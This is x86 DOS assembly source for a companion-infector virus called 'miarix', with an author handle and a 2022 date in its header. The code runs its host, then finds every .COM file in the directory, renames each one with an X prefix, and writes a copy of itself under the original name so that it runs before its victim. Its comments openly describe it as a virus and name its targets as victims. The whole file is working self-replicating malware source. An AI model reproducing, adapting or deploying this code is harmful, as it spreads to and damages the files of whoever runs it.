; miarix - companion version
; coded by Falsedeer@gamer.com.tw, 02/24/2022

; ==================== CODE AREA ======================
.model small
.CODE
.386
ORG 100h

Filename EQU (OFFSET DTA) + 1eh
virsize EQU (OFFSET finish) - (OFFSET start)

start:
    jmp exechost

exechost:
    mov bx, OFFSET virsize + 100h                       ;re-size memory to the minimun require
    mov ah, 4ah
    int 21h
    
    xor al, al
    mov bx, OFFSET paramblk
    mov dx, OFFSET Hostname
    mov sp, OFFSET finish + 100h                        ;move self(virus) after host program
    mov ah, 4bh
    int 21h
    
cleanup:
    mov ah, 1ah
    mov dx, OFFSET DTA
    int 21h                                             ;reset all register fucked up by host program
    mov ax, cs
    mov ss, ax
    mov ds, ax
    mov es, ax
    mov sp, (OFFSET virsize) + 200h                     ;reset stack pointer

search:
    mov ah, 4eh
    xor cx, cx                                          ;prepare for first search
    mov dx, OFFSET Filetype1    
    int 21h
    jc done                                             ;end process, if the isn't any first match
    xor di, di                                          ;set di to zero, prepare for filter's
    xor bp, bp
    mov bx, OFFSET Filename
    mov bp, OFFSET Hostname
    mov al, byte PTR [bx]                               ;saving filename's first letter manualy.
    mov byte PTR [bp], al
                                                        ;saving filename to var:Hostname
markup:                                                 ;moving all shits before terminate zero to overwrite hostname
    inc di
    xor ax, ax
    mov al, byte ptr [bx+di]
    mov byte ptr [bp+di], al
    cmp byte ptr [bp+di], '.'
    jnz markup

xchgext:                                               ;change the extension to COM
    inc di
    mov byte PTR [bp+di], 'C'
    inc di
    mov byte PTR [bp+di], 'O'
    inc di
    mov byte PTR [bp+di], 'M'
    inc di
    mov byte PTR [bp+di], 0                            ;adding a terminate zero for the var
    mov si, di

xchgname:
    lea bx, Hostname
    mov di, si
    mov byte ptr [bx], 'X'
    mov byte ptr [bx+di], 0
    lea bx, Hostname
    mov byte ptr [bx+di], 0

infect:
    mov ah, 56h                                         ;rename the new victim
    mov dx, OFFSET Filename                             ;original filename
    mov di, OFFSET Hostname                             ;new filename
    int 21h

    xor ax, ax
    mov ah, 3ch
    mov cx, 0                                           ;create new companion file
    mov dx, OFFSET Filename                             ;return file handler on ax
    int 21h

    xchg bx, ax                                         ;throw the file handle to bx
    mov ah, 40h                                         ;write virus to the companion file
    mov cx, OFFSET virsize
    mov dx, 100h
    int 21h

search_next:
    mov ah, 4fh                                         ;prepare for next search
    mov dx, OFFSET Filetype1
    int 21h
    jc done
    xor di, di
    xor bp, bp
    mov bx, OFFSET Filename
    mov bp, OFFSET Hostname
    mov al, byte PTR [bx]
    mov byte PTR [bp], al
    jmp markup

done:
    mov ah, 4ch
    int 21h
                         
; ====================== VAR AREA ======================
Hostname db "HELLO.COM",0                               ;this victim
Filetype1 db "*.COM",0                                  ;set COM File as target
msg db "test$"
DTA db 128 dup(0)                                       ;dta is 128 byte long
paramblk:                                               ;fucking parameter block for exec host program
    dw 0
    dw 0
    dw 5ch
    dw ?
    dw 6ch
    dw ?
    dw ?

; =====================================================    
    
finish:                                                 ;marks the end of code

end start
